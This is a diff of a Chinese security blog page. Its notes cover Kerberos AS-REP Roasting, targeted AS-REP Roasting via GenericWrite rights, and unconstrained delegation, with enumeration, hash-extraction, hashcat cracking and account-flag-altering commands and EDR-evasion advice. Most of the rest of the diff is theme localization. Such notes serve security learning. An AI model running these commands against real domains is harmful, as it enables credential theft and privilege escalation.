 <h3 id="AS-REP-Roasting-1"><a href="#AS-REP-Roasting-1" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p>当某个账户没有启用kerberos preauthentication的时候，攻击者可以指定用户向域控制器(KDC)请求一个AS-REQ请求，KDC此时不会做任何验证就会给攻击者返回TGT和使用用户密码hash加密的session key，如果这时我们就可以对目标用户的密码hash进行离线爆破。</p>
 <h4 id="攻击步骤-1"><a href="#攻击步骤-1" class="headerlink" title="攻击步骤"></a>攻击步骤</h4><h4 id="枚举用户"><a href="#枚举用户" class="headerlink" title="枚举用户"></a>枚举用户</h4><p>powershell脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -PreauthNotRequired</span><br><span class="line">Get-ADUser</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -PreauthNotRequired</span><br><span class="line">Get-ADUser</span><br></pre></td></tr></tbody></table></figure>
 
 <p>Impacket工具</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">impacket-GetNPUsers -dc-ip &lt;ip&gt; &lt;syn&gt;</span><br><span class="line">#impacket-GetNPUsers bruno.vl/svc_scan -dc-ip 10.129.238.9 -no-pass</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">impacket-GetNPUsers -dc-ip &lt;ip&gt; &lt;syn&gt;</span><br><span class="line">#impacket-GetNPUsers bruno.vl/svc_scan -dc-ip 10.129.238.9 -no-pass</span><br></pre></td></tr></tbody></table></figure>
 
 <h4 id="获取hash"><a href="#获取hash" class="headerlink" title="获取hash"></a>获取hash</h4><p><strong>当前主机在域内</strong></p>
 <p>rebueus or poweshell脚本 asreproast.ps1</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\ASREPRoast.ps1</span><br><span class="line">Get-ASREPHash -UserName hack2 -Domain xie.com | Out-File -Encoding ASCII hash.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\ASREPRoast.ps1</span><br><span class="line">Get-ASREPHash -UserName hack2 -Domain xie.com | Out-File -Encoding ASCII hash.txt</span><br></pre></td></tr></tbody></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asreproast</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asreproast</span><br></pre></td></tr></tbody></table></figure>
 
 <p><strong>非域内机器</strong></p>
 <p>1：对于非域内的机器，无法通过LDAP来发起用户名的查询。</p>
 <p>2：所以要想获取 “不需要kerberos预身份验证” 的域内账号，只能通过枚举用户名的方式来获得。而AS-REP Hash方面。非域内的主机，只要能和DC通信，便可以获取到。使用Get-ASREPHash，通过指定Server的参数即可</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\ASREPRoast.ps1</span><br><span class="line">Get-ASREPHash -UserName hack2 -Domain xie.com -Server 192.168.10.131 | Out-File -Encoding ASCII hash.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\ASREPRoast.ps1</span><br><span class="line">Get-ASREPHash -UserName hack2 -Domain xie.com -Server 192.168.10.131 | Out-File -Encoding ASCII hash.txt</span><br></pre></td></tr></tbody></table></figure>
 
-<h4 id="爆破hash"><a href="#爆破hash" class="headerlink" title="爆破hash"></a><strong>爆破hash</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+<h4 id="爆破hash"><a href="#爆破hash" class="headerlink" title="爆破hash"></a><strong>爆破hash</strong></h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></tbody></table></figure>
 
 
 
-<h2 id="Targeted-AS-REP-Roasting"><a href="#Targeted-AS-REP-Roasting" class="headerlink" title="Targeted AS-REP Roasting"></a>Targeted AS-REP Roasting</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AS-REP Roasting如果枚举发现目标账户里没有账户启用了不要求kerberos预认证，这时AS-REP Roasting用不了。但如果发现对某个AD用户有GeneriteWrite或GeneriteAll权限，我们可以使用这些权限修改目标账户的ACCount Control option 启用Do not require Keberos presauthenication，这样就可以执行AS-REP Roasting</span><br></pre></td></tr></table></figure>
+<h2 id="Targeted-AS-REP-Roasting"><a href="#Targeted-AS-REP-Roasting" class="headerlink" title="Targeted AS-REP Roasting"></a>Targeted AS-REP Roasting</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AS-REP Roasting如果枚举发现目标账户里没有账户启用了不要求kerberos预认证，这时AS-REP Roasting用不了。但如果发现对某个AD用户有GeneriteWrite或GeneriteAll权限，我们可以使用这些权限修改目标账户的ACCount Control option 启用Do not require Keberos presauthenication，这样就可以执行AS-REP Roasting</span><br></pre></td></tr></tbody></table></figure>
 
 <p>攻击步骤</p>
 <h3 id="枚举ACL-1"><a href="#枚举ACL-1" class="headerlink" title="枚举ACL"></a>枚举ACL</h3><p>寻找拥有对其有GeneriteWrite或GeneriteAll权限的用户</p>
 <p>使用Find-InterestingDomainAcl（powershell）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;$_.SecurityIdentifier -match &quot;rto&quot;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.SecurityIdentifier -match "rto"}</span><br></pre></td></tr></tbody></table></figure>
 
 <p>或者bloodhound探测域内环境也可以看到</p>
-<h3 id="启用”Do-not-require-Keberos-presauthenication”"><a href="#启用”Do-not-require-Keberos-presauthenication”" class="headerlink" title="启用”Do not require Keberos presauthenication”"></a>启用”Do not require Keberos presauthenication”</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject -Identity &quot;TargetUser&quot; -XOR @&#123;useraccountcontrol=4194304&#125; -Verbose</span><br><span class="line">Set-ADAccountControl -Id user01 -DoesNotRequirePreAuth:$true</span><br></pre></td></tr></table></figure>
+<h3 id="启用”Do-not-require-Keberos-presauthenication”"><a href="#启用”Do-not-require-Keberos-presauthenication”" class="headerlink" title="启用”Do not require Keberos presauthenication”"></a>启用”Do not require Keberos presauthenication”</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject -Identity "TargetUser" -XOR @{useraccountcontrol=4194304} -Verbose</span><br><span class="line">Set-ADAccountControl -Id user01 -DoesNotRequirePreAuth:$true</span><br></pre></td></tr></tbody></table></figure>
 
 <p>后面步骤就是AS-REP Roasting的步骤 略</p>
 <h2 id="Targeted-kerberoasting-VS-Targeted-AS-REP-Roasting"><a href="#Targeted-kerberoasting-VS-Targeted-AS-REP-Roasting" class="headerlink" title="Targeted kerberoasting VS Targeted AS-REP Roasting"></a>Targeted kerberoasting VS Targeted AS-REP Roasting</h2><table>
@@ -234,11 +233,11 @@
 </tbody></table>
 <p><strong>默认首选：Targeted Kerberoasting</strong>。因为它在攻击链中更隐蔽，且对域环境的侵入性相对较小。</p>
 <p><strong>备选方案：Targeted AS-REP Roasting</strong>。仅当你发现无法为该用户设置 SPN（例如 SPN 冲突）或者由于某些 EDR 规则对 TGS 请求监控极严，而对 AS-REQ 监控较松时使用。</p>
-<p><img src="https://picui.ogmua.cn/s1/2026/03/25/69c39b6b90708.webp" alt="03109a2bb3ab737c5a49e631bdace0ba.png"></p>
-<h2 id="Kerberos-Delegation"><a href="#Kerberos-Delegation" class="headerlink" title="Kerberos Delegation"></a>Kerberos Delegation</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">委派（Delegation） 是一种允许服务代表用户去访问其他资源的功能。攻击者一旦滥用这些机制，往往可以实现权限提升或横向移动</span><br></pre></td></tr></table></figure>
+<p><img src="https://picui.ogmua.cn/s1/2026/03/25/69c39b6b90708.webp" alt="03109a2bb3ab737c5a49e631bdace0ba.png" loading="lazy" decoding="async"></p>
+<h2 id="Kerberos-Delegation"><a href="#Kerberos-Delegation" class="headerlink" title="Kerberos Delegation"></a>Kerberos Delegation</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">委派（Delegation） 是一种允许服务代表用户去访问其他资源的功能。攻击者一旦滥用这些机制，往往可以实现权限提升或横向移动</span><br></pre></td></tr></tbody></table></figure>
 
 <p>委派相关的攻击全都存在Kerberos协议认证的step 4</p>
-<h3 id="非约束委派-Unconstrained-delegation"><a href="#非约束委派-Unconstrained-delegation" class="headerlink" title="非约束委派-Unconstrained delegation"></a>非约束委派-Unconstrained delegation</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户A去访问服务B，服务B的服务账户开启了非约束委派，那么当用户A访问服务B的时候会将用户A的TGT发送给服务B并保存进内存，服务B能够利用用户A的身份去访问用户A能够访问的任意服务</span><br></pre></td></tr></table></figure>
+<h3 id="非约束委派-Unconstrained-delegation"><a href="#非约束委派-Unconstrained-delegation" class="headerlink" title="非约束委派-Unconstrained delegation"></a>非约束委派-Unconstrained delegation</h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户A去访问服务B，服务B的服务账户开启了非约束委派，那么当用户A访问服务B的时候会将用户A的TGT发送给服务B并保存进内存，服务B能够利用用户A的身份去访问用户A能够访问的任意服务</span><br></pre></td></tr></tbody></table></figure>
 
 <p>当一个计算机或账号被设置为“非约束委派”时，任何域用户访问该服务，其 <strong>TGT（Ticket Granting Ticket，认购权证）</strong> 都会被发送到该服务器的内存中。</p>
 <ul>
@@ -251,7 +250,7 @@
 </article>
 <div class="article-footer">
     <section id="license">
-      <div class="header"><span>License</span></div>
+      <div class="header"><span>许可协议</span></div>
       <div class="body"><p>This article is licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a>. Please include attribution when reposting.</p>
 </div>
     </section>
@@ -259,7 +258,7 @@
 
 </div>
 
-<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">Newer</div><a href="/2026/04/28/JAVA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">反射机制解析</a></div><div class="item" id="next"><div class="note">Older</div><a href="/2026/04/01/order%20by%E6%B3%A8%E5%85%A5/">ORDER by 注入</a></div></section></div>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2026/04/28/JAVA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">反射机制解析</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2026/04/01/order%20by%E6%B3%A8%E5%85%A5/">ORDER by 注入</a></div></section></div>
 
 
 
@@ -273,26 +272,26 @@
 
 
 
-<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">On This Page</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kerberos%E5%8D%8F%E8%AE%AE"><span class="toc-text">Kerberos协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Client%E5%92%8CAS-Authentication-Service-%E4%BA%A4%E4%BA%92"><span class="toc-text">Client和AS(Authentication Service)交互</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Client-%E4%B8%8E-TGS-%E7%9A%84%E4%BA%A4%E4%BA%92"><span class="toc-text">Client 与 TGS 的交互</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Client-%E4%B8%8E-Server-%E7%9A%84%E4%BA%A4%E4%BA%92"><span class="toc-text">Client 与 Server 的交互</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kerberoasting%E6%94%BB%E5%87%BB"><span class="toc-text">kerberoasting攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SPN%EF%BC%88service-principal-name%EF%BC%89%E6%9C%8D%E5%8A%A1%E4%B8%BB%E4%BD%93%E5%90%8D%E7%A7%B0"><span class="toc-text">SPN（service principal name）服务主体名称</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberoasting%E6%94%BB%E5%87%BB-1"><span class="toc-text">kerberoasting攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="toc-text">攻击步骤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BESPN"><span class="toc-text">枚举SPN</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BC%E5%87%BA%E7%A5%A8%E6%8D%AE%E8%8E%B7%E5%8F%96hash%EF%BC%9A"><span class="toc-text">导出票据获取hash：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4hash%EF%BC%9A"><span class="toc-text">爆破hash：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Targeted-kerberoasting"><span class="toc-text">Targeted kerberoasting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BEACL"><span class="toc-text">枚举ACL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AESPN"><span class="toc-text">设置SPN</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AS-REP-Roasting"><span class="toc-text">AS-REP Roasting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberos-preauthentication-kerbers-%E9%A2%84%E8%AE%A4%E8%AF%81"><span class="toc-text">kerberos preauthentication (kerbers 预认证)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AS-REP-Roasting-1"><span class="toc-text">AS-REP Roasting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4-1"><span class="toc-text">攻击步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E7%94%A8%E6%88%B7"><span class="toc-text">枚举用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96hash"><span class="toc-text">获取hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4hash"><span class="toc-text">爆破hash</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Targeted-AS-REP-Roasting"><span class="toc-text">Targeted AS-REP Roasting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BEACL-1"><span class="toc-text">枚举ACL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E7%94%A8%E2%80%9DDo-not-require-Keberos-presauthenication%E2%80%9D"><span class="toc-text">启用”Do not require Keberos presauthenication”</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Targeted-kerberoasting-VS-Targeted-AS-REP-Roasting"><span class="toc-text">Targeted kerberoasting VS Targeted AS-REP Roasting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos-Delegation"><span class="toc-text">Kerberos Delegation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-Unconstrained-delegation"><span class="toc-text">非约束委派-Unconstrained delegation</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>Scroll to Top</span></a></div></widget>
-</div></aside><div class='float-panel'>
-  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
-    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"></path></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kerberos%E5%8D%8F%E8%AE%AE"><span class="toc-text">Kerberos协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Client%E5%92%8CAS-Authentication-Service-%E4%BA%A4%E4%BA%92"><span class="toc-text">Client和AS(Authentication Service)交互</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Client-%E4%B8%8E-TGS-%E7%9A%84%E4%BA%A4%E4%BA%92"><span class="toc-text">Client 与 TGS 的交互</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Client-%E4%B8%8E-Server-%E7%9A%84%E4%BA%A4%E4%BA%92"><span class="toc-text">Client 与 Server 的交互</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kerberoasting%E6%94%BB%E5%87%BB"><span class="toc-text">kerberoasting攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SPN%EF%BC%88service-principal-name%EF%BC%89%E6%9C%8D%E5%8A%A1%E4%B8%BB%E4%BD%93%E5%90%8D%E7%A7%B0"><span class="toc-text">SPN（service principal name）服务主体名称</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberoasting%E6%94%BB%E5%87%BB-1"><span class="toc-text">kerberoasting攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="toc-text">攻击步骤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BESPN"><span class="toc-text">枚举SPN</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BC%E5%87%BA%E7%A5%A8%E6%8D%AE%E8%8E%B7%E5%8F%96hash%EF%BC%9A"><span class="toc-text">导出票据获取hash：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4hash%EF%BC%9A"><span class="toc-text">爆破hash：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Targeted-kerberoasting"><span class="toc-text">Targeted kerberoasting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BEACL"><span class="toc-text">枚举ACL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AESPN"><span class="toc-text">设置SPN</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AS-REP-Roasting"><span class="toc-text">AS-REP Roasting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberos-preauthentication-kerbers-%E9%A2%84%E8%AE%A4%E8%AF%81"><span class="toc-text">kerberos preauthentication (kerbers 预认证)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AS-REP-Roasting-1"><span class="toc-text">AS-REP Roasting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4-1"><span class="toc-text">攻击步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E7%94%A8%E6%88%B7"><span class="toc-text">枚举用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96hash"><span class="toc-text">获取hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4hash"><span class="toc-text">爆破hash</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Targeted-AS-REP-Roasting"><span class="toc-text">Targeted AS-REP Roasting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BEACL-1"><span class="toc-text">枚举ACL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E7%94%A8%E2%80%9DDo-not-require-Keberos-presauthenication%E2%80%9D"><span class="toc-text">启用”Do not require Keberos presauthenication”</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Targeted-kerberoasting-VS-Targeted-AS-REP-Roasting"><span class="toc-text">Targeted kerberoasting VS Targeted AS-REP Roasting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos-Delegation"><span class="toc-text">Kerberos Delegation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-Unconstrained-delegation"><span class="toc-text">非约束委派-Unconstrained delegation</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"></path><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"></path></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class="float-panel">
+  <button type="button" style="display:none" class="laptop-only rightbar-toggle mobile" onclick="sidebar.rightbar()">
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"></path></svg>
   </button>
-  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
-    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  <button type="button" style="display:none" class="mobile-only leftbar-toggle mobile" onclick="sidebar.leftbar()">
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"></path><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"></path></g></svg>
   </button>
 </div>
 </div><div class="scripts">
 
 
 <script type="text/javascript">
-  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  window.canonical = {"originalHost":"sauy.top","officialHosts":["localhost","127.0.0.1"],"encoded":"c2F1eS50b3A="};
   const ctx = {
     date_suffix: {
-      just: `Just`,
-      min: `minutes ago`,
-      hour: `hours ago`,
-      day: `days ago`,
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
     },
     root : `/`,
     tag_plugins: {
@@ -365,6 +364,8 @@
     }
   }
 
+  const scriptLoads = new Map();
+
   const utils = {
     // 懒加载 css https://github.com/filamentgroup/loadCSS
     css: (href, before, media, attributes) => {
@@ -425,29 +426,40 @@
       return ss;
     },
 
-    js: (src, opt) => new Promise((resolve, reject) => {
-      var script = document.createElement('script');
+    js: (src, opt) => {
       if (src.startsWith('/')) {
         src = ctx.root + src.substring(1);
       }
-      script.src = src;
-      if (opt) {
-        for (let key of Object.keys(opt)) {
-          script[key] = opt[key]
+      const key = new URL(src, document.baseURI).href;
+      if (scriptLoads.has(key)) return scriptLoads.get(key);
+
+      const promise = new Promise((resolve, reject) => {
+        var script = document.createElement('script');
+        script.src = key;
+        if (opt) {
+          for (let key of Object.keys(opt)) {
+            script[key] = opt[key]
+          }
+        } else {
+          // 默认异步，如果需要同步，第二个参数传入 {} 即可
+          script.async = true
         }
-      } else {
-        // 默认异步，如果需要同步，第二个参数传入 {} 即可
-        script.async = true
-      }
-      script.onerror = reject
-      script.onload = script.onreadystatechange = function () {
-        const loadState = this.readyState
-        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-        script.onload = script.onreadystatechange = null
-        resolve()
-      }
-      document.head.appendChild(script)
-    }),
+        script.onerror = () => {
+          scriptLoads.delete(key);
+          script.remove();
+          reject(new Error(`脚本加载失败: ${key}`));
+        };
+        script.onload = script.onreadystatechange = function () {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(script)
+      });
+      scriptLoads.set(key, promise);
+      return promise;
+    },
 
     jq: (fn) => {
       if (typeof jQuery === 'undefined') {
@@ -574,6 +586,7 @@
     push: utils.dark.method.toggle.push,
   });
 </script>
+
 <script>
   const sidebar = {
     leftbar: () => {
@@ -627,7 +640,7 @@
   })()
 </script>
 
-<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script async="" src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
 <script>
   // https://www.npmjs.com/package/vanilla-lazyload
   // Set the options globally
@@ -696,7 +709,7 @@
 </script>
 
 <!-- required -->
-<script src="/js/main.js?v=1.33.1" defer></script>
+<script src="/js/main.js?v=1.33.1" defer=""></script>
 
 <script type="text/javascript">
   const applyTheme = (theme) => {
@@ -747,9 +760,9 @@
     utils.dark.method.toggle.start();
 
     const messages = {
-      light: `Switched to Light Mode`,
-      dark: `Switched to Dark Mode`,
-      auto: `Switched to Auto Mode`,
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
     }
     hud?.toast?.(messages[newTheme])
   }
